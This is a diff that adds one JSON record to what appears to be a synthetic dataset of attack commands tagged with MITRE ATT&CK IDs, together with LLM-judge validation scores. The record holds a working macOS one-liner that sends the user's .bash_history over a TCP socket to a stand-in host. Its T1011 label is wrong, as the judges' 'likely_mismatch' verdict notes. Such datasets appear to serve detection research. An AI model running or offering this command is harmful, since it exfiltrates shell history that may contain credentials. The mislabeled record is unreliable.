@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "IP=\"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\"; python3 -c \"import socket; s=socket.socket(); s.bind(('\"$IP\"',0)); s.connect(('203.0.113.90',54921)); s.sendall(open('/Users/$USER/.bash_history','rb').read()); s.close()\"",
+  "explanation": "Executes a Python TCP client bound to the Thunderbolt Bridge IP to exfiltrate content over a non-primary interface, consistent with T1011.",
+  "rationale_steps": [
+    "Get Thunderbolt Bridge IP via networksetup",
+    "Bind a user-space TCP socket to that IP",
+    "Send file content to a high, uncommon port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-6b36bb00",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid variable assignment, correct awk syntax, and properly structured Python code with appropriate quoting and escaping.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command does exfiltrate data (.bash_history), it doesn't align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public sources rather than exfiltrating data, making this more aligned with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T14:11:53.118540Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and parentheses with valid Bash and Python syntax; variable expansions and command separators are correct.",
+        "semantic_score": 1,
+        "semantic_justification": "The command exfiltrates data over a TCP socket but does not query paid/private data sources, so it does not align with the provided T1011 'Search Closed Sources' technique description.",
+        "combined_score": 3.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T14:12:46.044211Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.5,
+    "llm_average_score": 3.25,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
